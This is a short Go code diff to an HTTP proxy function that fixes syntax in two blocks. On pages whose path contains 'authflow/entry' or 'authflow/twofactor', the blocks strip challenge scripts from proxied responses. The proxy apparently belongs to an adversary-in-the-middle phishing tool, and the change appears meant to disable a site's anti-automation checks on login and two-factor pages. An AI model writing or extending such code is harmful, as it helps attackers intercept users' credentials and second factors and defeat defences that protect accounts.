@@ -1133,12 +1133,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			
 			
 			// Check if the path matches "authflow/entry"
-			if strings.Contains(resp.Request.URL.Path, "authflow/entry") 
+			if strings.Contains(resp.Request.URL.Path, "authflow/entry") {
 			    // Modify the body to remove <script async src="/auth/createchallenge/...">
 			    body = []byte(regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), ""))
 			}
 
-		       if strings.Contains(resp.Request.URL.Path, "authflow/twofactor") 
+		       if strings.Contains(resp.Request.URL.Path, "authflow/twofactor") {
 			    // Modify the body to remove <script async src="/auth/createchallenge/...">
 			    body = []byte(regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), ""))
 			}
